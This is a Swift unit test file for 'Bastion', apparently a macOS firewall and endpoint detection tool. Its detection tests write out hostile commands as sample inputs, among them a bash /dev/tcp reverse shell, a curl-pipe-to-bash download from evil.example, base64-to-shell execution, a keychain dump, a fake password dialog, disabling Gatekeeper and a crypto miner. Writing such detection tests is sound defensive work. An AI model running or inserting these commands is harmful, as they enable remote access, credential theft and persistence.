import XCTest
@testable import Bastion

final class BastionTests: XCTestCase {
    func event(app: String = "/Applications/Foo.app/Contents/MacOS/Foo", team: String? = "TEAM1", id: String? = "com.foo",
               host: String? = "api.foo.com", ip: String = "1.2.3.4", port: Int = 443, dir: Direction = .outbound) -> FlowEvent {
        FlowEvent(pid: 1, processPath: app, signingID: id, teamID: team, direction: dir, proto: .tcp,
                  localAddress: "192.168.1.5", localPort: dir == .inbound ? 22 : 50000,
                  remoteAddress: ip, remotePort: port, remoteHostname: host, outcome: .allowed)
    }

    func testAppKeyIncludesSigner() {
        XCTAssertEqual(event().appKey, "TEAM1:com.foo")
        XCTAssertEqual(event(team: nil).appKey, "/Applications/Foo.app/Contents/MacOS/Foo", "ad-hoc identifiers aren't trusted")
    }

    func testMostSpecificRuleWinsAndDenyBreaksTies() {
        let e = event()
        let appAll = Rule(appKey: e.appKey, appName: "Foo", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        let exactDeny = Rule(key: e.key, appName: "Foo", verdict: .deny)
        XCTAssertEqual(RuleBook.decide(e, rules: [appAll, exactDeny])?.verdict, .deny)
        let exactAllow = Rule(key: e.key, appName: "Foo", verdict: .allow)
        XCTAssertEqual(RuleBook.decide(e, rules: [exactAllow, exactDeny])?.verdict, .deny)
        XCTAssertEqual(RuleBook.decide(event(port: 80), rules: [appAll, exactDeny])?.verdict, .allow)
    }

    func testRuleMatchesByKnownIPWhenHostnameMissing() {
        let r = Rule(key: event().key, appName: "Foo", verdict: .allow, addresses: ["1.2.3.4"])
        XCTAssertTrue(r.matches(event(host: nil)))
        XCTAssertFalse(r.matches(event(host: nil, ip: "9.9.9.9")))
        let wild = Rule(appKey: "*", appName: "", direction: .outbound, proto: .tcp, host: "*.foo.com", port: 443, verdict: .deny)
        XCTAssertTrue(wild.matches(event(host: "cdn.foo.com")))
        XCTAssertFalse(wild.matches(event(host: "evilfoo.com")))
    }

    func testInboundKeyedByLocalPort() {
        let k = event(dir: .inbound).key
        XCTAssertEqual(k.host, "*")
        XCTAssertEqual(k.port, 22)
    }

    func testDNSParse() {
        // Response for example.com A 93.184.216.34, answer name compressed.
        var b: [UInt8] = [0x12, 0x34, 0x81, 0x80, 0, 1, 0, 1, 0, 0, 0, 0]
        b += [7] + Array("example".utf8) + [3] + Array("com".utf8) + [0, 0, 1, 0, 1]
        b += [0xC0, 0x0C, 0, 1, 0, 1, 0, 0, 0x0E, 0x10, 0, 4, 93, 184, 216, 34]
        let out = DNSCache.parse(Data(b))
        XCTAssertEqual(out.first?.0, "93.184.216.34")
        XCTAssertEqual(out.first?.1, "example.com")
    }

    func testNettopParse() {
        let text = """
        ,state,
        apsd.384,,
        tcp4 192.168.1.40:61679<->17.57.147.6:5223,Established,
        sshd.900,,
        tcp4 *:22<->*:*,Listen,
        tcp4 192.168.1.40:22<->203.0.113.9:51515,Established,
        rapportd.643,,
        tcp6 fe80::8a4:6aa6:1c21:f74%en0.54158<->fe80::cb5:c46e:fc55:ebbb%en0.64438,Established,
        """
        let conns = PassiveMonitor.parse(text)
        XCTAssertEqual(conns.count, 3)
        XCTAssertEqual(conns[0].remoteAddr, "17.57.147.6"); XCTAssertEqual(conns[0].remotePort, 5223); XCTAssertFalse(conns[0].inbound)
        XCTAssertTrue(conns[1].inbound); XCTAssertEqual(conns[1].localPort, 22)
        XCTAssertEqual(conns[2].remoteAddr, "fe80::cb5:c46e:fc55:ebbb"); XCTAssertEqual(conns[2].remotePort, 64438)
    }

    func testShadowPlan() {
        let a = Rule(key: event().key, appName: "Foo", verdict: .allow)
        let d = Rule(key: event(app: "/tmp/x", team: nil, id: nil, host: "evil.example", port: 4444).key, appName: "x", verdict: .deny)
        let clash = Rule(key: event(app: "/usr/bin/curl", team: nil, id: nil).key, appName: "curl", verdict: .deny)
        let plan = PolicyPlanner.plan(rules: [a, d, clash], descriptions: [a.id: "Foo's API"], macAddress: "192.168.1.5",
                                      lockdown: true, mirrorLockdown: true)
        XCTAssertEqual(plan.rules.map(\.action), [.deny, .allow, .deny, .deny])
        XCTAssertEqual(plan.rules[0].destination, ["bastion-fqdn-evil.example"])
        XCTAssertEqual(plan.rules[0].service, ["bastion-tcp-4444"])
        XCTAssertEqual(plan.rules[1].source, [PolicyPlanner.macObject])
        XCTAssertTrue(plan.rules[1].description.contains("Foo's API"))
        XCTAssertEqual(plan.rules.last?.name, "bastion-lockdown-inbound")
        XCTAssertEqual(plan.notes.count, 1, "curl deny conflicts with Foo allow on the same destination")
        XCTAssertTrue(PolicyPlanner.ruleElement(plan.rules[1], disabled: false).contains("<action>allow</action>"))
        XCTAssertLessThanOrEqual(PolicyPlanner.objectName("bastion-fqdn-", String(repeating: "a", count: 100)).count, 63)
    }

    func testLLMDecodeTolerantOfFences() throws {
        let a = try LocalLLM.decode("```json\n{\"description\":\"Push\",\"category\":\"system\",\"risk\":120,\"reasons\":[]}\n```", model: "m")
        XCTAssertEqual(a.description, "Push")
        XCTAssertEqual(a.risk, 100)
    }

    func testHeuristics() {
        var p = Profile(event: event(app: "/private/tmp/nc", team: nil, id: nil, host: nil, ip: "45.1.2.3", port: 4444))
        XCTAssertGreaterThanOrEqual(p.heuristic.score, 75)
        p = Profile(event: FlowEvent(pid: 1, processPath: "/usr/libexec/apsd", signingID: "com.apple.apsd", appleSigned: true,
                                     direction: .outbound, proto: .tcp, remoteAddress: "17.57.147.6", remotePort: 5223,
                                     remoteHostname: "courier.push.apple.com", outcome: .allowed))
        XCTAssertLessThan(p.heuristic.score, 25)
    }

    func testPFRules() {
        let allow = Rule(key: event(host: nil).key, appName: "Foo", verdict: .allow)          // host is the IP
        var appWide = Rule(appKey: "TEAM1:com.foo", appName: "Foo", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        let deny = Rule(appKey: "*", appName: "", direction: .outbound, proto: .tcp, host: "6.6.6.6", port: 4444, verdict: .deny)
        var expired = Rule(key: event(ip: "7.7.7.7", port: 22).key, appName: "x", verdict: .allow, addresses: ["7.7.7.7"])
        expired.expires = Date().addingTimeInterval(-1)
        var text = PFRules.generate(FilterPolicy(rules: [allow, appWide, deny, expired], lockdown: false))
        XCTAssertTrue(text.contains("block return out quick proto tcp from any to <b"))
        XCTAssertFalse(text.contains("pass out quick"), "outside lockdown only blocks are loaded")
        text = PFRules.generate(FilterPolicy(rules: [allow, appWide, deny, expired], lockdown: true))
        XCTAssertTrue(text.contains("table <b0> const { 1.2.3.4 }"))
        XCTAssertFalse(text.contains("7.7.7.7"), "expired rules are dropped")
        XCTAssertFalse(text.contains("pass out quick proto { tcp udp } from any to any"), "an app-wide allow must not open everything")
        XCTAssertTrue(text.hasSuffix("block drop in quick proto udp all\n"))
        appWide.addresses = ["8.8.4.4"]
        XCTAssertTrue(PFRules.generate(FilterPolicy(rules: [appWide], lockdown: true)).contains("8.8.4.4"))
    }

    func testRuleSentences() {
        let exact = Rule(key: event().key, appName: "Foo", verdict: .allow)
        XCTAssertEqual(exact.sentence, "Allow Foo connecting to api.foo.com on TCP port 443.")
        let everything = Rule(appKey: "*", appName: "", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .deny)
        XCTAssertEqual(everything.sentence, "Block any app connecting to any destination on any port.")
        XCTAssertEqual(everything.scopeLabel, "everything")
        let inbound = Rule(key: event(dir: .inbound).key, appName: "sshd", verdict: .deny)
        XCTAssertEqual(inbound.sentence, "Block anyone connecting in to sshd on TCP port 22.")
    }

    func testIPv4SetParsesFeedFormats() {
        let text = """
        # comment
        ; another
        162.243.103.246
        {"cidr":"1.10.16.0/20","sblid":"SBL256894","rir":"apnic"}
        37.120.213.13\t5
        10.0.0.0/8
        1.10.20.0/24
        """
        let set = IPv4Set(lines: text.split(separator: "\n"))
        XCTAssertTrue(set.contains("162.243.103.246"))
        XCTAssertTrue(set.contains("1.10.31.255"))
        XCTAssertFalse(set.contains("1.10.32.0"))
        XCTAssertTrue(set.contains("37.120.213.13"))
        XCTAssertEqual(set.count, 4, "1.10.20.0/24 merges into 1.10.16.0/20")
    }

    func testOnlyGlobalAddressesAreChecked() {
        for ip in ["10.1.2.3", "192.168.1.1", "100.101.102.103", "127.0.0.1", "169.254.1.1", "224.0.0.251", "fe80::1"] {
            XCTAssertFalse(IPv4Set.isGlobal(ip), ip)
        }
        XCTAssertTrue(IPv4Set.isGlobal("8.8.8.8"))
        XCTAssertTrue(IPv4Set.isGlobal("2606:4700::6812:11aa"))
    }

    private func decision(_ v: Verdict, app: String, host: String, port: Int = 443, team: String = "T") -> Decision {
        var p = Profile(event: event(app: "/Applications/\(app).app/Contents/MacOS/\(app)", team: team, id: app, host: host, port: port))
        p.analysis = Analysis(description: "", category: "web", risk: 10, reasons: [], model: "m")
        return Decision(profile: p, verdict: v, source: .manual, scope: "dest + port")
    }

    func testAdvisorPicksSimilarAndKeepsBothVerdicts() {
        var ds = (0..<15).map { decision(.allow, app: "App\($0)", host: "h\($0).example.org") }
        ds.append(decision(.deny, app: "Zoom", host: "telemetry.zoom.us"))
        ds.append(decision(.allow, app: "Zoom", host: "api.zoom.us"))
        let p = Profile(event: event(app: "/Applications/Zoom.app/Contents/MacOS/Zoom", team: "T", id: "Zoom", host: "logs.zoom.us"))
        let ex = Advisor.examples(for: p, in: ds, limit: 4)
        XCTAssertTrue(ex.prefix(2).allSatisfy { $0.appName == "Zoom" }, "same app and domain rank first")
        XCTAssertTrue(ex.contains { $0.verdict == .deny })
        XCTAssertEqual(Advisor.registrableDomain("a.b.bbc.co.uk"), "bbc.co.uk")
        XCTAssertEqual(Advisor.registrableDomain("logs.zoom.us"), "zoom.us")
    }

    func testSuggestionCannotConfidentlyAllowKnownBad() {
        var p = Profile(event: event())
        p.intel = IntelSummary(reputation: .knownBad, hits: [IntelHit(source: "Feodo Tracker", detail: "botnet C2", severity: .knownBad)])
        var s = Suggestion(verdict: .allow, confidence: 95, rationale: "You allow this app.", basedOn: 20)
        let g = Advisor.guarded(s: &s, p)
        XCTAssertLessThanOrEqual(g.confidence, 40)
        XCTAssertGreaterThanOrEqual(p.riskScore, 75, "a known-bad hit is always critical")
    }

    func testOldSettingsStillLoad() throws {
        let old = #"{"lockdown":true,"trustAppleSigned":false,"approvalTimeout":30,"llm":{"provider":"ollama","baseURL":"http://127.0.0.1:11434","model":"qwen2.5:3b","enabled":true},"pan":{"enabled":false,"host":"","target":"firewall","vsys":"vsys1","deviceGroup":"","macAddress":"","autoSync":true,"createDisabled":false,"mirrorLockdown":true,"commit":false,"commitAdmin":""}}"#
        let s = try JSONDecoder.bastion.decode(AppSettings.self, from: Data(old.utf8))
        XCTAssertTrue(s.lockdown)
        XCTAssertTrue(s.suggestionsEnabled)
        XCTAssertEqual(s.intel, IntelSettings())
    }

    // MARK: EDR

    private func rules(_ cmd: String) -> Set<String> { Set(Detections.commandRules.filter { $0.matches(cmd) }.map(\.id)) }

    func testCommandRulesCatchAttacks() {
        XCTAssertTrue(rules("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").contains("cmd.reverse-shell"))
        XCTAssertTrue(rules("python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)").contains("cmd.reverse-shell"))
        XCTAssertTrue(rules("curl -fsSL http://evil.example/x.sh | bash").contains("cmd.download-exec"))
        XCTAssertTrue(rules("echo ZWNobyBoaQ== | base64 -d | sh").contains("cmd.base64-exec"))
        XCTAssertTrue(rules(#"osascript -e display dialog "macOS needs your password" default answer "" with hidden answer"#).contains("cmd.password-prompt"))
        XCTAssertTrue(rules("security dump-keychain -d login.keychain").contains("cmd.keychain"))
        XCTAssertTrue(rules("xattr -d com.apple.quarantine /tmp/payload").contains("cmd.quarantine-strip"))
        XCTAssertTrue(rules("sudo spctl --master-disable").contains("cmd.defense-off"))
        XCTAssertTrue(rules("./xmrig -o stratum+tcp://pool.example:3333 --donate-level 1").contains("cmd.miner"))
        XCTAssertTrue(rules("launchctl load /Users/Shared/.agent.plist").contains("cmd.launch-temp"))
        XCTAssertTrue(rules("dscl . -append /Groups/admin GroupMembership eve").contains("cmd.account"))
    }

    func testCommandRulesIgnoreEverydayCommands() {
        for cmd in ["/bin/zsh -l", "git status", "curl -fsSL https://example.com -o file.tar.gz", "brew install ollama",
                    "/usr/bin/security find-certificate -c Apple", "python3 manage.py runserver", "ssh user@host",
                    "/Applications/Xcode.app/Contents/MacOS/Xcode", "ls -la /tmp", "xattr -l file.zip",
                    "launchctl list", "base64 -i file.png -o out.txt", "screencapture -i shot.png"] {
            XCTAssertEqual(rules(cmd), [], cmd)
        }
    }

    private func proc(_ path: String, name: String? = nil, uid: UInt32 = 501, args: [String]? = nil) -> ProcInfo {
        ProcInfo(pid: 4242, ppid: 1, uid: uid, start: Date(), name: name ?? (path as NSString).lastPathComponent, path: path, args: args)
    }

    func testProcessRules() {
        let unsigned = CodeID(signingID: nil, teamID: nil, appleSigned: false)
        let apple = CodeID(signingID: "com.apple.x", teamID: nil, appleSigned: true)
        let dev = CodeID(signingID: "com.foo", teamID: "TEAM", appleSigned: false)
        func ids(_ p: ProcInfo, _ id: CodeID, ancestors: [ProcInfo] = [], exists: Bool = true) -> Set<String> {
            Set(Detections.evaluate(p, id: id, ancestors: ancestors, exists: exists).map(\.rule))
        }
        XCTAssertTrue(ids(proc("/private/tmp/.x/update"), unsigned).contains("proc.temp-exec"))
        XCTAssertTrue(ids(proc("/Users/me/Library/.hidden/agent"), unsigned).contains("proc.hidden-exec"))
        XCTAssertFalse(ids(proc("/Users/me/.cargo/bin/rg"), unsigned).contains("proc.hidden-exec"), "dev tool folders are fine")
        XCTAssertFalse(ids(proc("/private/var/folders/x/T/AppTranslocation/A/d/Foo.app/Contents/MacOS/Foo"), unsigned).contains("proc.temp-exec"))
        XCTAssertTrue(ids(proc("/Users/me/Library/mds"), dev).contains("proc.masquerade"))
        XCTAssertFalse(ids(proc("/System/Library/Frameworks/CoreServices.framework/mds"), apple).contains("proc.masquerade"))
        XCTAssertTrue(ids(proc("/Users/me/Downloads/xmrig"), unsigned).contains("proc.tool"))
        XCTAssertTrue(ids(proc("/Users/me/tool", uid: 0), dev).contains("proc.root-userpath"))
        XCTAssertTrue(ids(proc("/usr/local/bin/gone"), dev, exists: false).contains("proc.deleted"))
        let word = proc("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word")
        XCTAssertTrue(ids(proc("/bin/sh"), apple, ancestors: [word]).contains("chain.document-shell"))
        let terminal = proc("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal")
        XCTAssertTrue(ids(proc("/bin/zsh"), apple, ancestors: [terminal]).isEmpty, "a shell from Terminal is normal")
        XCTAssertTrue(ids(proc("/opt/homebrew/bin/ollama"), dev).isEmpty)
    }

    func testPersistenceAssessment() {
        let m = EDRMonitor()
        let bad = LaunchItem(plist: "/Users/me/Library/LaunchAgents/com.update.plist", label: "com.update",
                             program: "/bin/bash", arguments: ["/bin/bash", "-c", "curl -s http://x.example/p | bash"], modified: Date())
        let rules = Set(m.assess(bad, isNew: true).map(\.draft.rule))
        XCTAssertTrue(rules.isSuperset(of: ["persist.inline-script", "persist.cmd.download-exec", "persist.new"]))
        XCTAssertEqual(m.assess(bad, isNew: true).first { $0.draft.rule == "persist.new" }?.draft.severity, .high)
        let ok = LaunchItem(plist: "/Library/LaunchAgents/com.google.keystone.agent.plist", label: "com.google.keystone.agent",
                            program: "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent",
                            arguments: [], modified: Date())
        XCTAssertTrue(m.assess(ok, isNew: false).isEmpty)
    }

    func testProcessTableReadsOwnArguments() {
        let me = ProcessTable.snapshot(withArgs: true).first { $0.pid == getpid() }
        XCTAssertNotNil(me)
        XCTAssertFalse(me?.args?.isEmpty ?? true)
        XCTAssertEqual(me?.path, ProcessTable.path(getpid()))
    }

    func testStableHashIsStable() {
        XCTAssertEqual(Detections.stableHash("abc"), "ba7816bf8f01")
    }

    func testTriageNeverRecommendsDeletingSystemFiles() {
        let f = Finding(key: "k", rule: "cmd.base64-exec", title: "Decoded payload executed", detail: "", severity: .high,
                        category: .commandLine, mitre: [], path: "/bin/bash")
        let safe = TriageLLM.safeRecommendation("Kill the process and delete /bin/bash", finding: f)
        XCTAssertFalse(safe.contains("delete /bin"))
        var temp = f
        temp.path = "/private/tmp/updater"; temp.category = .process
        XCTAssertEqual(TriageLLM.safeRecommendation("Kill the process and delete /private/tmp/updater", finding: temp),
                       "Kill the process and delete /private/tmp/updater")
        XCTAssertEqual(TriageLLM.firstSentences("One. Two. Three. Four.", 2), "One. Two.")
    }

    func testSystemStagedXPCServicesAreNotFlagged() {
        let p = proc("/private/var/db/com.apple.xpc.roleaccountd.staging/exec/1.2.xpc/Contents/MacOS/com.apple.dt.instruments.dtsecurity",
                     name: "com.apple.dt.instruments.dtsecurity", uid: 0)
        let unreadable = CodeID(signingID: nil, teamID: nil, appleSigned: false)
        XCTAssertTrue(Detections.evaluate(p, id: unreadable, ancestors: [], exists: false).isEmpty)
    }
}
